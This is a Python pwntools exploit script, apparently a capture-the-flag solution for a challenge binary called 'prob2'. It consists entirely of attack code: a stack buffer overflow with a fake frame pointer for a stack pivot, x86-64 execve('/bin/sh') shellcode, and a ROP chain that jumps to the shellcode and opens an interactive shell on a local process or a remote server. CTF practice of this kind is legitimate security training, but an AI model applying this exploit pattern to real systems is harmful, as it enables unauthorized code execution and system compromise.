from pwn import *

context.log_level = 'INFO'

def solver() :
    fake_rbp = 0x601400
    trigger = 0x4005a0

    sc_addr = 0x601300
    sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    rop1 = 0x40061A
    rop2 = 0x400600

    pay = 'a'*256
    pay += p64(fake_rbp)
    pay += p64(trigger)
    s.sendline(pay)

    pause()
    pay = p64(sc_addr+8)
    pay += sc
    pay += '\x00' * (256-len(pay))
    pay += p64(0)
    pay += p64(rop1)
    pay += p64(0)
    pay += p64(0)
    pay += p64(sc_addr)
    pay += p64(0)
    pay += p64(0)
    pay += p64(0)
    pay += p64(rop2)
    s.sendline(pay)

    s.interactive()

if __name__ == '__main__' :
    if len(sys.argv) == 1:
        s = process('./prob2')
        print util.proc.pidof(s)
        pause()
    else :
        s = remote('juwon1405.iptime.org', 5252)

    solver()

